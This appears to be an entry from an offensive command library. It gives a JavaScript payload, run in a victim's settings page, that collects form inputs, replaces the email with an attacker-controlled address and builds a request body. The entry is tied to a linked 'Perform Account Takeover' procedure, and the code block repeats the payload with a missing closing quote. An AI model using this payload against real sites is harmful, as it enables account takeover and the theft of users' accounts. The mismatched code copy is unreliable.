---
id: cmd-form-extract-modify
data: >-
  forms = document.getElementsByTagName("form")[5]; inputs =
  forms.getElementsByTagName("input"); body = ""; for(var i =0; i <
  inputs.length; i++){ if(inputs[i].name=="email"){
  inputs[i].value="attacker@protonmail.com"; } body
  +=inputs[i].name+"="+inputs[i].value+"&"; } body +=
  "_jafo[activeExperiments]=[]&_jafo[experimentData]={};"
tags:
  - form-parse
  - data-modify
type: command
output: body string with encoded form data
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:13.014Z'
verified: false
validated: true
submitted: true
---
# Extract and Modify Form Data

## Command

```javascript
forms = document.getElementsByTagName("form")[5]; inputs = forms.getElementsByTagName("input"); body = ""; for(var i =0; i < inputs.length; i++){ if(inputs[i].name=="email"){ inputs[i].value="attacker@protonmail.com"; } body +=inputs[i].name+"="+inputs[i].value+"&"; } body += "_jafo[activeExperiments]=[]&_jafo[experimentData]={};
```

## Description

Extracts inputs from 6th form, modifies email, builds body.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| email | New value | Yes |

## Examples

### Basic Usage

```javascript
// Run in settings page context
```

## Expected Output

body: 'name1=value1&email=attacker@...&...'

## Related

- [[Related Procedure: Perform Account Takeover]]
